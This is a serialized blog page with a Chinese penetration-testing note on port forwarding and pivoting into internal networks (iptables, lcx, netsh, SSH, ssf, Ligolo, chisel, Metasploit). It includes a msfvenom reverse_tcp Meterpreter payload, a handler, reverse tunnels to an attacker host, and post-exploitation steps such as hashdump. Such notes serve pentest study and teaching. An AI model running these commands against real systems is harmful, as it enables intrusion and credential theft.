src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/168.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt; &lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/169.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;ligolo\&quot;&gt;Ligolo&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#ligolo\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cd `go env GOPATH`/src&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;📢反引号 `...` 是 命令替换的意思，实际效果就是会返回go的环境变量路径拼接到后面使用。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;git clone https://github.com/sysdream/ligolo&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;cd ligolo&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;make dep&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;生成证书,example.com换成攻击机的域名或IP地址&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;make certs TLS_HOST=example.com&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;make build-all&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;靶机执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ligolo_windows_amd64.exe -relayserver 攻击机IP:5555&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;攻击机执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;./bin/localrelay_linux_amd64&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;以上场景适用于内网靶机可访问外网，但外网无法访问内网的情况，最后生成一个在攻击机上的11601 的socks5监听端口，实际生成效果和以下命令相似：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ssh -CfNg -D 11601 root@靶机IP&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;区别是隧道搭建时是靶机连攻击机，ssh是攻击机连靶机&lt;/p&gt;\n&lt;h1 id=\&quot;chisel\&quot;&gt;chisel&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#chisel\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;工具下载链接：\n&lt;a href=\&quot;https://github.com/jpillora/chisel\&quot;&gt;https://github.com/jpillora/chisel&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;攻击机执行&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chisel server -p 12138 –reverse&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/182.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;\n靶机执行&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;chisel client 公网攻击机IP:12138 R:1234:127.0.0.1:3389&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/183.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;\n建立成功后，攻击机连接本机1234端口即可访问靶机3389\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/184.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;iptables&quot;],&quot;text&quot;:[0,&quot;iptables&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;lcx&quot;],&quot;text&quot;:[0,&quot;lcx&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;msf&quot;],&quot;text&quot;:[0,&quot;msf&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;netsh&quot;],&quot;text&quot;:[0,&quot;netsh&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;ssf&quot;],&quot;text&quot;:[0,&quot;ssf&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;ssh&quot;],&quot;text&quot;:[0,&quot;ssh&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;invoke-socksproxy&quot;],&quot;text&quot;:[0,&quot;Invoke-SocksProxy&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;ligolo&quot;],&quot;text&quot;:[0,&quot;Ligolo&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;chisel&quot;],&quot;text&quot;:[0,&quot;chisel&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;端口映射和转发&quot;],&quot;date&quot;:[3,&quot;2026-01-23T10:36:57.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;端口转发&quot;],[0,&quot;映射&quot;],[0,&quot;代理&quot;],[0,&quot;proxy&quot;]]],&quot;categories&quot;:[1,[[0,&quot;Penetration&quot;],[0,&quot;内网和域&quot;]]]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/28&quot;]}]]],&quot;currentPostSlug&quot;:[0,&quot;penetration/内网和域/内网常用命令&quot;],&quot;prevPostItem&quot;:[0,null],&quot;nextPostItem&quot;:[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/内网和域/端口转发和映射&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;端口映射和转发&quot;],&quot;date&quot;:[3,&quot;2026-01-23T10:36:57.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;端口转发&quot;],[0,&quot;映射&quot;],[0,&quot;代理&quot;],[0,&quot;proxy&quot;]]],&quot;categories&quot;:[1,[[0,&quot;Penetration&quot;],[0,&quot;内网和域&quot;]]]}],&quot;body&quot;:[0,&quot;# iptables\n\n```\n需开启ip转发功能\n&gt;vim /etc/sysctl.conf设置net.ipv4.ip_forward=1\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/179.png) ![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/180.png)\n\n```\n本地端口22转发到2222上\n&gt;iptables -t nat -A PREROUTING -p tcp --dport 2222 -j REDIRECT --to-ports 22\n内网98机器3389转到本机110的6789上\n&gt;iptables -t nat -A PREROUTING -d 192.168.0.110 -p tcp --dport 6789 -j DNAT --to-destination 192.168.0.98:3389\n&gt;iptables -t nat -A POSTROUTING -d 192.168.0.98 -p tcp --dport 3389 -j SNAT --to 192.168.0.110\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/181.png)\n\n```\n查看规则\n&gt;iptables -t nat -L\n删除规则\n&gt;iptables -t nat -D PREROUTING 1\n删除全部规则\n&gt;iptables -t nat –F\n```\n# lcx\n\n```\n使用条件：服务器通外网，拥有自己的公网ip\n靶机：lcx.exe -slave 外网IP 9999 127.0.0.1 3389\nlinux攻击机：./portmap -m 2 -p1 9999 -p2 33889\nwindows攻击机：lcx -listen 9999 33889 把本机9999监听的信息转到33889\nPortTran\nhttps://github.com/k8gege/K8tools/raw/master/PortTran.rar\n攻击机执行\n&gt;PortTranS20.exe 12345 389\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/163.png)\n\n```\n靶机执行\n&gt;PortTranC20.exe 127.0.0.1 3389 192.168.0.102 12345\n建立连接后，攻击机连接本机389端口即可\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/164.png)\n# msf\n\n```\nMeterpreter 列出活动的端口转发\n&gt;portfwd list\n使用条件：服务器通外网，拥有自己的公网ip\n&gt;portfwd add -l 5555 -p 3389 -r 172.16.86.153\n转发目标主机的3389远程桌面服务端口到本地的5555\n删除转发\n&gt;portfwd delete –l 3389 –p 3389 –r target-host \n&gt;portfwd flush\n```\n# netsh\n\n```\n边界机器执行：\n&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=2222 connectaddress=10.1.1.108 connectport=22\n将内网10.1.1.108主机22端口转发至本机2222端口，攻击机连接边界机器2222端口即可访问内网SSH\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/176.png)\n\n```\n&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=13389 connectaddress=192.168.0.98 connectport=3389\n当靶机某服务只允许内网访问时，将端口转发出来\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/177.png)\n\n```\n添加防火墙规则：\n&gt;netsh advfirewall firewall add rule name=\&quot;RDP\&quot; protocol=TCP dir=in localip=192.168.0.98 localport=13389 action=allow\n列出所有转发规则:\n&gt;netsh interface portproxy show all\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/178.png)\n\n```\n删除指定的端口转发规则：\n&gt;netsh interface portproxy delete v4tov4 listenport=13389 listenaddress=192.168.0.98\n删除所有转发规则：\n&gt;netsh interface portproxy reset\n```\n# ssf\n\n**单层网络正向转发**\n\n```\nhttps://github.com/securesocketfunneling/ssf/releases\n内网机执行：\n&gt;ssfd.exe -p 1080\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/170.png)\n\n```\n边界机器执行\n&gt;ssf.exe -L 12138:10.1.1.108:22 -p 1080 192.168.0.98 \n把内网10.1.1.108的SSH转发出来\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/171.png)\n\n```\n边界机器访问内网端口\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/172.png)\n\n**单层网络反向转发**\n\n```\n边界机器执行：\n&gt;ssfd.exe -p 1080\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/173.png)\n\n```\n内网机器执行：\n&gt;ssf.exe -R 12138:10.1.1.108:22 -p 1080 192.168.0.106\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/174.png) ![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/175.png)\n# ssh\n\n**SSH基本参数**\n\n```\n-C 压缩传输，加快传输速度\n-f 在后台对用户名密码进行认证\n-N 仅仅只用来转发，不用再弹回一个新的shell -n 后台运行\n-q 安静模式，不要显示任何debug信息\n-l 指定ssh登录名\n-g 允许远程主机连接到本地用于转发的端口\n-L 进行本地端口转发\n-R 进行远程端口转发\n-D 动态转发，即socks代理\n-T 禁止分配伪终端\n-p 指定远程ssh服务端口\n```\n\n**正向转发**\n1. 方法一\n外网靶机110，内网靶机115\n本地攻击机编辑后restart ssh服务\n```\n#vim /etc/ssh/sshd_conf\nAllowTcpForwarding yes 允许TCP转发\nGatewayPorts yes   允许远程主机连接本地转发的端口\nTCPKeepAlive yes    TCP会话保持存活\nPasswordAuthentication yes  密码认证\n```\n本地攻击机执行，把115的3389映射到本地的33890上\n```\n&gt;ssh -C -f -N -g -L 33890:192.168.0.115:3389 root@192.168.0.110 -p 22\n```\n2. 方法2（上线MSF）\n** 攻击机--出网Linux靶机--不出网Linux靶机--不出网win机 **\n攻击逻辑说明：\n* Windows 执行 1.exe\n* → 连接 “不出网 Linux:12138”\n*   ↓ （SSH 转发）\n* 不出网 Linux 把 12138 映射到 “出网 Linux:12138”\n*   ↓ （SSH 转发）\n*  出网 Linux 把 12138 映射到 “攻击机:12345”\n    ↓\n* 攻击机 msfconsole 收到 meterpreter 会话\n```\nmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=不出网Linux机 lport=12138 -f exe -o /var/www/html/1.exe\n```\n攻击机监听端口12345\n```\nmsf6 &gt; use exploit/multi/handler\nmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) &gt; set lhost 0.0.0.0\nmsf6 exploit(multi/handler) &gt; set lport 12345\nmsf6 exploit(multi/handler) &gt; set ExitOnSession false\nmsf6 exploit(multi/handler) &gt; exploit -j\n[*] Exploit running as background job 0.\n[*] Started reverse TCP handler on 0.0.0.0:12345\n```\n不出网Linux机\n```\nssh -C -f -N -g -L 0.0.0.0:12138:攻击机:12345 root@出网Linux主机 -p 22\n```\n这样就建立连接了，然后可以这样做\n```\n# 把会话放到后台\nmeterpreter &gt; background\n# 查看/升级 transport（断网重连）\nmsf6 &gt; sessions -i 1\nmeterpreter &gt; transport list\nmeterpreter &gt; transport add -t reverse_tcp -l 攻击机公网IP -p 443\nmeterpreter &gt; transport next\n# 常用其它命令\nmeterpreter &gt; sysinfo # 系统版本 / 补丁\t\nmeterpreter &gt; getuid # 当前用户 / 特权\t\nmeterpreter &gt; run post/windows/gather/enum_domain #域信息\t\nmeterpreter &gt; run post/windows/gather/enum_av 杀软 / 防火墙\t\nmeterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.0-3.0/24 # 网络段\t\nmeterpreter &gt; hashdump（需 SYSTEM） # 密码哈希（需SYSTEM）\nmeterpreter &gt; run post/windows/gather/enum_logged_on_users # 最近登录\t\n```\n\n**反向转发**\n\n外网攻击107，内网靶机97\n\n出网靶机编辑后restart ssh服务\n```\n#vim /etc/ssh/sshd_conf\nAllowTcpForwarding yes 允许TCP转发\nGatewayPorts yes   允许远程主机连接本地转发的端口\nTCPKeepAlive yes    TCP会话保持存活\nPasswordAuthentication yes  密码认证\n```\n边界靶机上执行，把内网靶机97的3389映射到公网VPS107的33809上\nssh -C -f -N -g -R 33890:10.1.1.97:3389 root@192.168.0.107 -p 22\nnetstat –tnlp\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/165.png)\n\n```\n转发成功，外网攻击机安装apt install rinetd(正向tcp转发工具)\n&gt;vim /etc/rinetd.conf\n添加0.0.0.0 3389 127.0.0.1 33890\n&gt;service rinetd start\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/166.png)\n\n```\n看到107是kali攻击机，连接107:33890即可到达内网10.1.1.97的桌面\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/167.png)\n\n# Invoke-SocksProxy\n\n```\nhttps://gitee.com/RichChigga/Invoke-SocksProxy\n&gt;Import-Module .\\Invoke-SocksProxy.psm1 \n&gt;Invoke-SocksProxy -bindPort 12138 建立socks代理，使用代理软件连接\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/168.png) ![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/169.png)\n# Ligolo\n\n```\ncd `go env GOPATH`/src\n📢反引号 `...` 是 命令替换的意思，实际效果就是会返回go的环境变量路径拼接到后面使用。\n&gt;git clone https://github.com/sysdream/ligolo\n&gt;cd ligolo\n&gt;make dep\n生成证书,example.com换成攻击机的域名或IP地址\n&gt;make certs TLS_HOST=example.com\n\n&gt;make build-all\n\n靶机执行\n&gt;ligolo_windows_amd64.exe -relayserver 攻击机IP:5555\n攻击机执行\n&gt;./bin/localrelay_linux_amd64\n```\n以上场景适用于内网靶机可访问外网，但外网无法访问内网的情况，最后生成一个在攻击机上的11601 的socks5监听端口，实际生成效果和以下命令相似：\n```\nssh -CfNg -D 11601 root@靶机IP\n```\n区别是隧道搭建时是靶机连攻击机，ssh是攻击机连靶机\n# chisel\n\n工具下载链接：\nhttps://github.com/jpillora/chisel \n\n攻击机执行\n```\nchisel server -p 12138 –reverse\n```\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/182.png)\n靶机执行\n```\n&gt;chisel client 公网攻击机IP:12138 R:1234:127.0.0.1:3389\n```\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/183.png)\n建立成功后，攻击机连接本机1234端口即可访问靶机3389\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/184.png)&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/内网和域/端口转发和映射.md&quot;],&quot;digest&quot;:[0,&quot;1484ba373c9d8ff6&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;iptables\&quot;&gt;iptables&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#iptables\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;需开启ip转发功能&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;vim /etc/sysctl.conf设置net.ipv4.ip_forward=1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/179.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt; &lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/180.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;本地端口22转发到2222上&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat -A PREROUTING -p tcp --dport 2222 -j REDIRECT --to-ports 22&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;内网98机器3389转到本机110的6789上&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat -A PREROUTING -d 192.168.0.110 -p tcp --dport 6789 -j DNAT --to-destination 192.168.0.98:3389&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat -A POSTROUTING -d 192.168.0.98 -p tcp --dport 3389 -j SNAT --to 192.168.0.110&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/181.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;查看规则&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat -L&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;删除规则&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat -D PREROUTING 1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;删除全部规则&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat –F&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;lcx\&quot;&gt;lcx&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#lcx\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;使用条件：服务器通外网，拥有自己的公网ip&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;靶机：lcx.exe -slave 外网IP 9999 127.0.0.1 3389&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;linux攻击机：./portmap -m 2 -p1 9999 -p2 33889&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;windows攻击机：lcx -listen 9999 33889 把本机9999监听的信息转到33889&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PortTran&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/k8gege/K8tools/raw/master/PortTran.rar&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;攻击机执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;PortTranS20.exe 12345 389&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/163.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;靶机执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;PortTranC20.exe 127.0.0.1 3389 192.168.0.102 12345&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;建立连接后，攻击机连接本机389端口即可&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/164.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;msf\&quot;&gt;msf&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#msf\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Meterpreter 列出活动的端口转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;portfwd list&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;使用条件：服务器通外网，拥有自己的公网ip&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;portfwd add -l 5555 -p 3389 -r 172.16.86.153&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;转发目标主机的3389远程桌面服务端口到本地的5555&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;删除转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;portfwd delete –l 3389 –p 3389 –r target-host &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;portfwd flush&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;netsh\&quot;&gt;netsh&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#netsh\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span 